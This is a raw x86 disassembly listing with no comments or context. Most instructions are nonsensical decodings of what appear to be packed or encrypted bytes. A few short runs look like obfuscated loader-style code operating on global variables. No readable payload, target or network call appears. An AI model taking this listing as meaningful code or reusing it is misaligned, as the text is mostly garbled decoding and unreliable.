  40cd75:	and    BYTE PTR [ebx-0x1b6c085d],bh
  40cd7b:	inc    ebx
  40cd7c:	cmp    DWORD PTR [ebx-0x1d],0x66
  40cd80:	xor    eax,0xcfa4c732
  40cd85:	fwait
  40cd86:	ins    BYTE PTR es:[edi],dx
  40cd87:	mov    al,0x56
  40cd89:	fld    QWORD PTR [edx+0x49af40f4]
  40cd8f:	repnz rol DWORD PTR [eax-0x71],1
  40cd93:	lods   al,BYTE PTR ds:[esi]
  40cd94:	ret    
  40cd95:	out    dx,eax
  40cd96:	xchg   edi,eax
  40cd97:	and    eax,0xbe737dba
  40cd9c:	ss pop es
  40cd9e:	and    al,0xce
  40cda0:	xchg   esi,eax
  40cda1:	lods   eax,DWORD PTR ds:[esi]
  40cda2:	fcomp  DWORD PTR [esi+edi*8-0x26]
  40cda6:	sbb    bl,BYTE PTR [ebp+esi*8+0x66]
  40cdaa:	or     ecx,eax
  40cdac:	ror    DWORD PTR [ecx-0x1f],1
  40cdaf:	nop
  40cdb0:	dec    ebp
  40cdb1:	fnstsw WORD PTR [ebp-0x49d29c1]
  40cdb7:	pop    ds
  40cdb8:	xor    bh,BYTE PTR [ecx]
  40cdba:	sbb    ebx,DWORD PTR [ebx]
  40cdbc:	(bad)  
  40cdbd:	pop    edi
  40cdbe:	xor    eax,0x9e9ed2bf
  40cdc3:	js     0x40cd81
  40cdc5:	pop    ss
  40cdc6:	cwde   
  40cdc7:	aas    
  40cdc8:	dec    edi
  40cdc9:	mov    al,ds:0xea2bb126
  40cdce:	add    al,0xb6
  40cdd0:	mov    esi,0xead42907
  40cdd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdd6:	jne    0x40cd61
  40cdd8:	jmp    0x40ce23
  40cdda:	inc    edi
  40cddb:	xor    eax,0xcb1dc89c
  40cde0:	inc    eax
  40cde1:	daa    
  40cde2:	scas   eax,DWORD PTR es:[edi]
  40cde3:	mov    esp,0x98ace537
  40cde8:	and    bh,ah
  40cdea:	pop    ss
  40cdeb:	or     dl,BYTE PTR [esi-0x20f038a0]
  40cdf1:	call   0x82cf:0x9161d590
  40cdf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdf9:	and    DWORD PTR [eax+0x6e],0x9a37b2b6
  40ce00:	mov    esp,0x218b22b
  40ce05:	jns    0x40cdde
  40ce07:	cmp    edx,DWORD PTR [ebp+0x720c0f56]
  40ce0d:	pop    ebx
  40ce0f:	jne    0x40cde9
  40ce11:	push   edi
  40ce12:	scas   eax,DWORD PTR es:[edi]
  40ce13:	adc    BYTE PTR [ebx],bl
  40ce15:	ret    0x2edb
  40ce18:	out    0x13,eax
  40ce1a:	sub    BYTE PTR [ebx+0x2bae97ae],bl
  40ce20:	mov    BYTE PTR [ecx-0x44],ch
  40ce23:	inc    ecx
  40ce24:	jae    0x40ce12
  40ce26:	scas   eax,DWORD PTR es:[edi]
  40ce27:	sbb    ebp,DWORD PTR [eax-0x4a]
  40ce2a:	inc    edi
  40ce2b:	push   eax
  40ce2c:	jmp    0x40cdf0
  40ce2e:	jo     0x40ce68
  40ce30:	cmp    BYTE PTR [edx],dh
  40ce32:	test   eax,0x96174938
  40ce37:	lods   eax,DWORD PTR ds:[esi]
  40ce38:	dec    esp
  40ce39:	out    dx,eax
  40ce3a:	cdq    
  40ce3b:	or     esi,DWORD PTR [ebx*1-0x3e4aacb8]
  40ce42:	sub    eax,0x8141008c
  40ce47:	lds    esi,FWORD PTR [esi-0x44fe95f1]
  40ce4d:	sbb    eax,edi
  40ce4f:	test   DWORD PTR [ecx],ebp
  40ce51:	cmc    
  40ce52:	push   edx
  40ce53:	in     al,dx
  40ce54:	pop    ecx
  40ce55:	push   ecx
  40ce56:	xlat   BYTE PTR ds:[ebx]
  40ce57:	popf   
  40ce58:	mov    cl,0x18
  40ce5a:	mov    edi,0x58a1f088
  40ce5f:	shl    esp,cl
  40ce61:	dec    ecx
  40ce62:	lods   eax,DWORD PTR ds:[esi]
  40ce63:	adc    esp,DWORD PTR [eax+0x15]
  40ce66:	fcmove st,st(5)
  40ce68:	add    al,0x7f
  40ce6a:	mov    gs,edi
  40ce6c:	fwait
  40ce6d:	cli    
  40ce6e:	iret   
  40ce6f:	lods   al,BYTE PTR ds:[esi]
  40ce70:	adc    eax,DWORD PTR [ebx]
  40ce72:	xchg   ebx,eax
  40ce73:	cdq    
  40ce74:	(bad)  
  40ce75:	pop    es
  40ce76:	jo     0x40ceca
  40ce78:	cld    
  40ce79:	cmp    eax,0x912c4d4a
  40ce7e:	in     eax,0x41
  40ce80:	aad    0x2b
  40ce82:	pop    ecx
  40ce83:	push   cs
  40ce84:	push   0x22
  40ce86:	jne    0x40ce88
  40ce88:	and    BYTE PTR [ebx-0x5],0xba
  40ce8c:	sbb    eax,0xbccf869b
  40ce91:	xchg   edi,eax
  40ce92:	pusha  
  40ce93:	stos   BYTE PTR es:[edi],al
  40ce94:	scas   eax,DWORD PTR es:[edi]
  40ce95:	test   eax,0x395ca622
  40ce9a:	shr    BYTE PTR [edi-0x4f15ef2c],1
  40cea0:	adc    al,BYTE PTR [esi]
  40cea2:	mov    ds:0xa770db31,al
  40cea7:	nop
  40cea8:	or     esi,DWORD PTR [ebx]
  40ceaa:	stc    
  40ceab:	aas    
  40ceac:	stos   BYTE PTR es:[edi],al
  40cead:	icebp  
  40ceae:	pop    esp
  40ceaf:	push   ebx
  40ceb0:	xor    al,0x3b
  40ceb2:	sbb    edi,ebp
  40ceb4:	add    eax,0x5e32a944
  40ceb9:	mov    edi,0x5a1ee9b
  40cebe:	push   eax
  40cebf:	and    eax,0x71c32a71
  40cec4:	xor    al,0xfa
  40cec6:	xlat   BYTE PTR ds:[ebx]
  40cec7:	mov    WORD PTR [esp+ebx*4],gs
  40ceca:	push   ds
  40cecb:	mul    BYTE PTR [edi+0x71991a95]
  40ced1:	lds    esi,FWORD PTR [esi]
  40ced3:	mov    ebx,0xc947b479
  40ced8:	mov    edi,DWORD PTR [ebp-0x46]
  40cedb:	pushf  
  40cedc:	add    BYTE PTR [bp+di],0x7f
  40cee0:	nop
  40cee1:	dec    esp
  40cee2:	in     eax,0x31
  40cee4:	loop   0x40cede
  40cee6:	test   eax,0xbd75704d
  40ceeb:	shl    edx,0x39
  40ceee:	stos   BYTE PTR es:[edi],al
  40ceef:	dec    ebx
  40cef0:	mov    cl,0x99
  40cef2:	fst    st(0)
  40cef4:	nop
  40cef5:	push   ebx
  40cef6:	cs pop ss
  40cef8:	mov    ch,0x1
  40cefa:	mov    esp,0x1c6fe006
  40ceff:	int    0xa8
  40cf01:	xchg   ebp,eax
  40cf02:	retf   0x5dc9
  40cf05:	lock fisub WORD PTR [esi*8-0x27f5f705]
  40cf0d:	push   edx
  40cf0e:	aaa    
  40cf0f:	js     0x40cf44
  40cf11:	xlat   BYTE PTR ds:[ebx]
  40cf12:	popf   
  40cf13:	xchg   esp,eax
  40cf14:	(bad)  
  40cf15:	fld    DWORD PTR [edi+0x26564563]
  40cf1b:	mov    DWORD PTR [eax+0x1b],edx
  40cf1e:	mov    esi,0xfd89277e
  40cf23:	and    DWORD PTR [ebx+eax*8],edx
  40cf26:	call   0x9ac7:0xd1c4df6d
  40cf2d:	mov    ah,0x9c
  40cf2f:	fcomp  QWORD PTR [edi+0x645de533]
  40cf35:	rol    BYTE PTR [edi+0x24afc566],cl
  40cf3b:	cmc    
  40cf3c:	rcl    DWORD PTR [ebp+0x3d3009fb],1
  40cf42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf43:	ins    DWORD PTR es:[edi],dx
  40cf44:	lods   al,BYTE PTR ds:[esi]
  40cf45:	xchg   esi,eax
  40cf46:	push   ecx
  40cf47:	fmul   DWORD PTR [edx]
  40cf49:	sub    edi,esi
  40cf4b:	or     BYTE PTR [eax+0x738adc7e],bh
  40cf51:	shl    DWORD PTR [ecx-0x28],cl
  40cf54:	fwait
  40cf55:	jb     0x40cf67
  40cf57:	shr    eax,0x22
  40cf5a:	cmc    
  40cf5b:	xchg   BYTE PTR [ebx],ch
  40cf5d:	fwait
  40cf5e:	into   
  40cf5f:	pop    eax
  40cf60:	adc    eax,0x69fa4a51
  40cf65:	(bad)  
  40cf66:	rcl    ah,1
  40cf68:	stc    
  40cf69:	jl     0x40cfaf
  40cf6b:	test   DWORD PTR [eax],eax
  40cf6d:	shl    BYTE PTR [ebx-0x2eb1f227],1
  40cf73:	aas    
  40cf74:	call   0x7614225
  40cf79:	(bad)  
  40cf7a:	and    ebx,edi
  40cf7c:	mov    ebx,0xa9fdbdf4
  40cf81:	or     BYTE PTR [esi],cl
  40cf83:	sbb    dh,BYTE PTR [eax-0x218fac5b]
  40cf89:	arpl   si,cx
  40cf8b:	hlt    
  40cf8c:	je     0x40b5e7
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42a845,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42a879,0x42a75d
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	add    al,BYTE PTR [ebx+0x5b]
  40cfcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfce:	sub    ah,BYTE PTR [edi+0x7e357878]
  40cfd4:	js     0x40d04e
  40cfd6:	fsubr  st,st(7)
  40cfd8:	xchg   esp,eax
  40cfd9:	fist   WORD PTR [edx+ebx*4]
  40cfdc:	div    BYTE PTR [ebx*2+0x5b35b0fe]
  40cfe3:	adc    DWORD PTR [edx],eax
  40cfe5:	sub    al,0xf9
  40cfe7:	cmp    BYTE PTR [eax-0x2],0xd6
  40cfeb:	into   
  40cfec:	jl     0x40cfce
  40cfee:	jno    0x40d066
  40cff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cff1:	push   eax
  40cff2:	cmp    BYTE PTR [edx-0x4cbb1574],bh
  40cff8:	call   0x7a5c:0xb02edc
  40cfff:	in     al,dx
  40d000:	or     edi,esp
  40d002:	das    
  40d003:	lidtd  [eax+ecx*2]
  40d007:	repz fcomp DWORD PTR [edx+0x1c]
  40d00b:	out    0xfe,al
  40d00d:	cmp    al,0xe
  40d00f:	ins    BYTE PTR es:[edi],dx
  40d010:	ds fwait
  40d012:	into   
  40d013:	dec    esi
  40d014:	fisttp DWORD PTR [ebx+0x79]
  40d017:	gs pushf 
  40d019:	jge    0x40d097
  40d01b:	div    DWORD PTR [ebx-0x66fb6270]
  40d021:	ds das 
  40d023:	mov    DWORD PTR [eax-0x6f2f6128],edx
  40d029:	inc    eax
  40d02a:	dec    eax
  40d02b:	cwde   
  40d02c:	(bad)  
  40d02d:	mov    bh,0x16
  40d02f:	mov    al,ds:0x354d5cd7
  40d034:	jp     0x40cfc4
  40d036:	dec    ebp
  40d037:	sub    edx,DWORD PTR [eax+0xe89a305]
  40d03d:	jmp    0x40d060
  40d03f:	out    0x3f,al
  40d041:	jb     0x40d0be
  40d043:	cmp    bl,al
  40d045:	and    cl,BYTE PTR [eax-0x9094e94]
  40d04b:	sahf   
  40d04c:	sbb    al,0x87
  40d04e:	retf   
  40d04f:	and    edi,ebx
  40d051:	test   esp,ebx
  40d053:	pop    eax
  40d054:	and    al,0xeb
  40d056:	aas    
  40d057:	mov    al,ds:0x5a507706
  40d05c:	jb     0x40cff9
  40d05e:	pop    edi
  40d05f:	not    BYTE PTR ds:0x97ba46de
  40d065:	test   al,0x98
  40d067:	jmp    0x9b4aff5b
  40d06c:	inc    ebx
  40d06d:	mov    ebx,0x992a3c85
  40d072:	retf   0x2c36
  40d075:	pop    es
  40d076:	jg     0x40cff9
  40d078:	sub    eax,0x633fd27c
  40d07d:	sub    edi,esp
  40d07f:	add    DWORD PTR [esi-0x64a56fc8],esp
  40d085:	sub    bl,BYTE PTR ds:[eax]
  40d088:	cmp    eax,0xee1b7ea1
  40d08d:	test   DWORD PTR [edx-0x3880c380],ecx
  40d093:	inc    esi
  40d094:	sti    
  40d095:	inc    ecx
  40d096:	and    ebp,edx
  40d098:	sub    eax,0x75c5ff8b
  40d09d:	mov    ebx,0xa63cd40b
  40d0a2:	jb     0x40d047
  40d0a4:	push   ecx
  40d0a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0a6:	je     0x40d0e5
  40d0a8:	dec    ebp
  40d0a9:	iret   
  40d0aa:	arpl   WORD PTR [eax],di
  40d0ac:	jo     0x40d0d3
  40d0ae:	daa    
  40d0af:	jbe    0x40d0e8
  40d0b1:	sbb    BYTE PTR [eax+0x30],bh
  40d0b4:	or     DWORD PTR [eax],0x23a84c73
  40d0ba:	dec    edi
  40d0bb:	jno    0x40d075
  40d0bd:	lods   al,BYTE PTR ds:[esi]
  40d0be:	lods   eax,DWORD PTR ds:[esi]
  40d0bf:	dec    ebp
  40d0c0:	pop    ds
  40d0c1:	push   0xffffffe2
  40d0c3:	pop    eax
  40d0c4:	adc    eax,0x9bce8c91
  40d0c9:	jae    0x40d06a
  40d0cb:	mov    dl,0x48
  40d0cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0ce:	push   ecx
  40d0cf:	sub    DWORD PTR [eax-0x20],esi
  40d0d2:	mov    ah,0x28
  40d0d4:	add    al,0x19
  40d0d6:	add    eax,ebx
  40d0d8:	dec    eax
  40d0d9:	gs out 0xd5,eax
  40d0dc:	cmp    eax,0x6df48e8d
  40d0e1:	das    
  40d0e2:	xor    eax,0x9f444b82
  40d0e7:	pop    ebx
  40d0e8:	jne    0x40d0de
  40d0ea:	mov    BYTE PTR [ebp+0x2e],bl
  40d0ed:	call   0x3e2b:0xf935d04e
  40d0f4:	outs   dx,DWORD PTR ds:[esi]
  40d0f5:	call   0x3d0b:0xa5766dd6
  40d0fc:	push   ecx
  40d0fd:	scas   eax,DWORD PTR es:[edi]
  40d0fe:	out    dx,eax
  40d0ff:	cmp    al,BYTE PTR [ebx-0x4f]
  40d102:	ins    BYTE PTR es:[edi],dx
  40d103:	jmp    0x34cec142
  40d108:	icebp  
  40d109:	pop    eax
  40d10a:	add    al,0xe1
  40d10c:	popa   
  40d10d:	pop    edx
  40d10e:	xchg   BYTE PTR [ebx+0x5922be21],al
  40d114:	ds mov edx,?
  40d117:	dec    esp
  40d118:	out    0x67,al
  40d11a:	les    ecx,FWORD PTR [eax-0x1a04b775]
  40d120:	out    0x85,eax
  40d122:	shl    BYTE PTR [edx],0x42
  40d125:	lahf   
  40d126:	shl    BYTE PTR [esi+0x150575d8],cl
  40d12c:	jmp    0xfab3:0x77d5818f
  40d133:	test   eax,0xee656888
  40d138:	mov    bl,0xf8
  40d13a:	das    
  40d13b:	pop    es
  40d13c:	iret   
  40d13d:	cmc    
  40d13e:	test   al,0x75
  40d140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d141:	xchg   ebp,eax
  40d142:	mov    ecx,0xdaa749e7
  40d147:	bound  ecx,QWORD PTR [esi-0x35]
  40d14a:	fsub   QWORD PTR [eax+0x1de4df8c]
  40d150:	add    eax,0x7cd00492
  40d155:	mov    cl,0xaf
  40d157:	mov    al,ds:0x8662e633
  40d15c:	push   0x9cba6de9
  40d161:	(bad)  
  40d162:	jp     0x40d17a
  40d164:	dec    edi
  40d165:	shl    BYTE PTR [esi+esi*8+0x154f04a],1
  40d16c:	jecxz  0x40d1b3
  40d16e:	xor    ebx,esp
  40d170:	lods   al,BYTE PTR ds:[esi]
  40d171:	repnz push esp
  40d173:	sbb    ch,BYTE PTR [esi+0x71]
  40d176:	inc    esi
  40d177:	sbb    al,0x8e
  40d179:	in     al,dx
  40d17a:	pop    esi
  40d17b:	nop
  40d17c:	ficomp WORD PTR [eax+eax*8+0x7bbed02]
  40d183:	xchg   BYTE PTR [ecx],ah
  40d185:	push   edi
  40d186:	mov    ds:0xb18d3587,eax
  40d18b:	arpl   WORD PTR [ecx],sp
  40d18d:	jle    0x40d16f
  40d18f:	cmp    BYTE PTR [ebx-0x4824581b],ch
  40d195:	out    0x7c,eax
  40d197:	sub    al,0xdf
  40d199:	inc    ecx
  40d19a:	add    DWORD PTR [eax-0x8],0x550de845
  40d1a1:	inc    ebx
  40d1a2:	lods   eax,DWORD PTR ds:[esi]
  40d1a3:	cmp    ebp,DWORD PTR [edi+esi*4]
  40d1a6:	repz fs xchg ebp,eax
  40d1a9:	push   ebp
  40d1aa:	mov    ebp,0xe243df60
  40d1af:	pusha  
  40d1b0:	jmp    0x47e3:0x6e884a07
  40d1b7:	sar    cl,cl
  40d1b9:	jae    0x40d237
  40d1bb:	adc    DWORD PTR [eax],esi
  40d1bd:	cdq    
  40d1be:	add    al,0x50
  40d1c0:	jge    0x40d241
  40d1c2:	xchg   BYTE PTR [ebx],ah
  40d1c4:	xor    DWORD PTR [edi],edx
  40d1c6:	push   0xffffffe1
  40d1c8:	(bad)  
  40d1c9:	std    
  40d1ca:	xchg   ecx,eax
  40d1cb:	stos   BYTE PTR es:[edi],al
  40d1cc:	inc    eax
  40d1cd:	inc    ebx
  40d1ce:	jmp    0x40d1c5
  40d1d0:	jp     0x40d20a
  40d1d2:	addr16 out 0xee,al
  40d1d5:	push   ss
  40d1d6:	adc    al,0x3b
  40d1d8:	sbb    bl,bh
  40d1da:	in     eax,0x96
  40d1dc:	jb     0x40d230
  40d1de:	xchg   ebx,eax
  40d1df:	xor    eax,0xa5215619
  40d1e4:	add    edi,eax
  40d1e6:	dec    ebx
  40d1e7:	mov    ebp,0xba5e0b8f
  40d1ec:	es loop 0x40d183
  40d1ef:	sar    BYTE PTR [edx+0x40212d5a],0xc1
  40d1f6:	or     edx,DWORD PTR [ebx+0x483713e7]
  40d1fc:	repnz fwait
  40d1fe:	cwde   
  40d1ff:	hlt    
  40d200:	adc    DWORD PTR [esp+eiz*8+0x6a5beccf],ecx
  40d207:	cmp    ch,BYTE PTR [eax]
  40d209:	or     ecx,DWORD PTR [esi]
  40d20b:	inc    ebx
  40d20c:	and    DWORD PTR [ecx-0x5b],edi
  40d20f:	push   ebp
  40d210:	jg     0x40d265
  40d212:	push   esi
  40d213:	and    DWORD PTR ds:0x42a7b5,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42a7b5
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42a7b5,ebx
  40d22f:	cmp    DWORD PTR ds:0x42a7b5,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42a7b5,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42a775
  40d260:	xor    ebx,DWORD PTR ds:0x42a75d
  40d266:	mov    DWORD PTR ds:0x42a775,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42a7bd,0x42a879
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42a889,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42a879,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42a845
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	pop    ss
  40d2ba:	gs adc al,0x17
  40d2bd:	out    0xa5,eax
  40d2bf:	js     0x40d339
  40d2c1:	xor    eax,0x278787e
  40d2c6:	ja     0x40d291
  40d2c8:	add    bl,BYTE PTR [ebp-0x4044266a]
  40d2ce:	cmp    bh,BYTE PTR [eax+0x4e41e145]
  40d2d4:	js     0x40d30a
  40d2d6:	popf   
  40d2d7:	ins    BYTE PTR es:[edi],dx
  40d2d8:	and    ecx,DWORD PTR [ebx+ebp*1+0x73eb64c5]
  40d2df:	cld    
  40d2e0:	cmp    DWORD PTR [ecx+0x5a74bab8],eax
  40d2e6:	sbb    esi,0x12
  40d2e9:	jno    0x40d2a5
  40d2eb:	lods   al,BYTE PTR ds:[esi]
  40d2ec:	mov    DWORD PTR [edx+0x4ddda7ea],ebp
  40d2f2:	adc    ah,bh
  40d2f4:	in     eax,dx
  40d2f5:	sbb    eax,0x695e207f
  40d2fa:	jmp    0x13c222b9
  40d2ff:	pop    edi
  40d300:	in     eax,dx
  40d301:	adc    bh,BYTE PTR [ebx]
  40d303:	xor    al,BYTE PTR [ebx-0xd]
  40d306:	xchg   esp,eax
  40d307:	ror    BYTE PTR [edx-0x5c],1
  40d30a:	(bad)  
  40d30b:	cmp    dl,BYTE PTR [esi+0x319a1b4]
  40d311:	mov    al,0x7
  40d313:	jg     0x40d329
  40d315:	pop    ebx
  40d316:	and    BYTE PTR [esi],dl
  40d318:	xor    DWORD PTR [ebp+0x7efc1d1],0xe5984ed7
  40d322:	stos   DWORD PTR es:[edi],eax
  40d323:	mov    ebx,0xf0bc205b
  40d328:	jo     0x40d35c
  40d32a:	mov    ecx,0x743a81e9
  40d32f:	inc    esp
  40d330:	jge    0x40d2cc
  40d332:	mov    al,0x80
  40d334:	cli    
  40d335:	fnsave [edx+esi*2]
  40d338:	jns    0x40d343
  40d33a:	push   edi
  40d33b:	rcr    BYTE PTR [ebx+0x18],cl
  40d33e:	fidivr DWORD PTR [edi-0x41c7fea4]
  40d344:	jno    0x40d332
  40d346:	test   dl,ah
  40d348:	call   0x30ec1277
  40d34d:	lock iret 
  40d34f:	cmp    BYTE PTR [ecx],dh
  40d351:	lods   eax,DWORD PTR ds:[esi]
  40d352:	mov    eax,ds:0x33433460
  40d357:	daa    
  40d358:	int3   
  40d359:	jmp    0x367f:0x38ee95c8
  40d360:	hlt    
  40d361:	out    0xf,al
  40d363:	push   esp
  40d364:	mov    bl,0xe
  40d366:	rcr    ah,1
  40d368:	pop    ss
  40d369:	shr    BYTE PTR [eax-0x71feff1f],1
  40d36f:	loope  0x40d363
  40d371:	jns    0x40d3b9
  40d373:	mov    eax,0x3cc62ff6
  40d378:	push   esi
  40d379:	mov    ch,al
  40d37b:	ds aam 0xe0
  40d37e:	or     eax,0x837d17d
  40d383:	and    eax,esi
  40d385:	imul   DWORD PTR [edx-0x529c478d]
  40d38b:	dec    eax
  40d38c:	jnp    0x40d40c
  40d38e:	ret    
  40d38f:	jbe    0x40d345
  40d391:	nop
  40d392:	cwde   
  40d393:	push   ebx
  40d394:	cmp    BYTE PTR [edi],bl
  40d396:	push   ebp
  40d397:	out    dx,al
  40d398:	xor    esp,DWORD PTR [edx]
  40d39a:	cmp    edx,esp
  40d39c:	sub    al,0x1a
  40d39e:	(bad)  
  40d39f:	addr16 jne 0x40d3a0
  40d3a2:	sbb    WORD PTR [ebx+0xf],0x2e
  40d3a7:	test   eax,0x83a87352
  40d3ac:	xor    edi,ebx
  40d3ae:	mov    eax,0xd05d436
  40d3b3:	push   edi
  40d3b4:	dec    esi
  40d3b5:	mov    ah,0xea
  40d3b7:	outs   dx,BYTE PTR ds:[esi]
  40d3b8:	int    0x66
  40d3ba:	fistp  WORD PTR [edx]
  40d3bc:	mov    bl,0x9
  40d3be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3bf:	pop    edx
  40d3c0:	mov    esi,0x1a7c5e99
  40d3c5:	bound  esp,QWORD PTR [esi+ebp*2]
  40d3c8:	and    ch,BYTE PTR [esi+0x25337e47]
  40d3ce:	pop    edi
  40d3cf:	cli    
  40d3d0:	hlt    
  40d3d1:	inc    eax
  40d3d2:	sub    esp,eax
  40d3d4:	(bad)  
  40d3d5:	lock ret 0x31e0
  40d3d9:	std    
  40d3da:	inc    di
  40d3dc:	jnp    0x40d3b8
  40d3de:	adc    ecx,esp
  40d3e0:	cmp    ch,BYTE PTR ds:0x6303d657
  40d3e6:	fs ret 
  40d3e8:	adc    esp,ecx
  40d3ea:	adc    edx,DWORD PTR [edx-0x133cb7aa]
  40d3f0:	jmp    0x76c4:0xf2e7ec6b
  40d3f7:	je     0x40d390
  40d3f9:	or     al,0x6e
  40d3fb:	adc    BYTE PTR [ebp-0x3c2d15f0],dl
  40d401:	imul   edx,DWORD PTR [esi],0xffffffee
  40d404:	addr16 or al,0x61
  40d407:	test   al,0xad
  40d409:	push   edi
  40d40a:	jmp    0x5e1ef8be
  40d40f:	mov    dh,0xc6
  40d411:	cdq    
  40d412:	ja     0x40d3e0
  40d414:	(bad)  
  40d415:	jecxz  0x40d425
  40d417:	fild   QWORD PTR [ebp-0x42]
  40d41a:	int    0xc6
  40d41c:	mov    esp,DWORD PTR [ebp+0x75]
  40d41f:	xlat   BYTE PTR ds:[ebx]
  40d420:	jns    0x40d432
  40d422:	jae    0x40d409
  40d424:	loop   0x40d3a8
  40d426:	mov    edi,ebx
  40d428:	and    ch,al
  40d42a:	in     eax,dx
  40d42b:	call   0x852:0xed0b656a
  40d432:	cmp    ch,BYTE PTR [edi]
  40d434:	push   cs
  40d435:	cmp    eax,0x8684ed63
  40d43a:	dec    esp
  40d43b:	sbb    BYTE PTR [ecx+eax*1+0x7c],dl
  40d43f:	jmp    0x3ee19b47
  40d444:	pop    ebx
  40d445:	add    bh,al
  40d447:	out    dx,eax
  40d448:	dec    ecx
  40d449:	and    DWORD PTR [ebx+0x4f],ebp
  40d44c:	inc    edx
  40d44d:	add    al,0x17
  40d44f:	and    al,0xa8
  40d451:	jg     0x40d42f
  40d453:	pusha  
  40d454:	pushf  
  40d455:	mov    bh,0x2
  40d457:	push   ds
  40d458:	jmp    0x40d41d
  40d45a:	mov    dl,0xfa
  40d45c:	in     al,dx
  40d45d:	adc    BYTE PTR [esi+0x7f],bh
  40d460:	dec    edx
  40d461:	inc    eax
  40d462:	mov    ah,ch
  40d464:	pop    edx
  40d465:	pushf  
  40d466:	inc    ecx
  40d467:	syscall 
  40d469:	or     edi,DWORD PTR ds:0xb218b1cd
  40d46f:	xchg   edx,eax
  40d470:	in     al,0x6b
  40d472:	and    BYTE PTR [edx-0x1d],dh
  40d475:	in     eax,0xe5
  40d477:	int    0x3e
  40d479:	and    ch,bh
  40d47b:	jmp    0x24b9943
  40d480:	sub    dh,cl
  40d482:	xor    DWORD PTR [edi+edi*8],ebp
  40d485:	lock je 0x40d46c
  40d488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d489:	pop    esi
  40d48a:	pop    ds
  40d48b:	call   0x906d:0xba9bbeab
  40d492:	inc    eax
  40d493:	aam    0xde
  40d495:	push   ecx
  40d496:	ficomp DWORD PTR [esi-0x6de367f0]
  40d49c:	popf   
  40d49d:	rol    BYTE PTR [eax+0x5f],0xd6
  40d4a1:	icebp  
  40d4a2:	fld    TBYTE PTR [ecx]
  40d4a4:	cs jmp 0x40d4cd
  40d4a7:	fmul   QWORD PTR [ebp+ebp*1+0xd]
  40d4ab:	bound  esp,QWORD PTR [edi-0x2eaba86d]
  40d4b1:	stc    
  40d4b2:	test   BYTE PTR [edx],dh
  40d4b4:	rol    ch,1
  40d4b6:	add    DWORD PTR [ecx],eax
  40d4b8:	movd   DWORD PTR [ebx+0x4c],mm5
  40d4bc:	retf   
  40d4bd:	rcr    BYTE PTR [edx-0x79],cl
  40d4c0:	sub    DWORD PTR [edi],ebx
  40d4c2:	shl    BYTE PTR [ecx],0x31
  40d4c5:	jp     0x40d4e4
  40d4c7:	das    
  40d4c8:	shl    BYTE PTR [edx-0x5191cd43],cl
  40d4ce:	mov    dl,0x4
  40d4d0:	test   BYTE PTR [ecx+edx*2+0x15],dl
  40d4d4:	or     BYTE PTR ds:0x630cb74b,ch
  40d4da:	xchg   edx,eax
  40d4db:	and    dl,dh
  40d4dd:	dec    edx
  40d4de:	dec    ebx
  40d4df:	dec    ecx
  40d4e0:	mov    ebp,0xbea51a70
  40d4e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4e6:	dec    esp
  40d4e7:	and    ebp,DWORD PTR [edx]
  40d4e9:	sbb    BYTE PTR [ebp+0x3b],0x3d
  40d4ed:	scas   al,BYTE PTR es:[edi]
  40d4ee:	cmp    eax,ebp
  40d4f0:	xchg   ebp,eax
  40d4f1:	mov    dl,0x65
  40d4f3:	leave  
  40d4f4:	enter  0x4144,0x22
  40d4f8:	jge    0x40d572
  40d4fa:	push   ss
  40d4fb:	mov    edi,0x6e2a69f6
  40d500:	mov    DWORD PTR [ebp-0xc],0xf89c85f8
  40d507:	mov    DWORD PTR [ebp-0x10],0xf89c8738
  40d50e:	and    DWORD PTR ds:0x42a7f5,0x42a805
  40d518:	add    edi,ebx
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42a769,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42a7cd,0x1d30
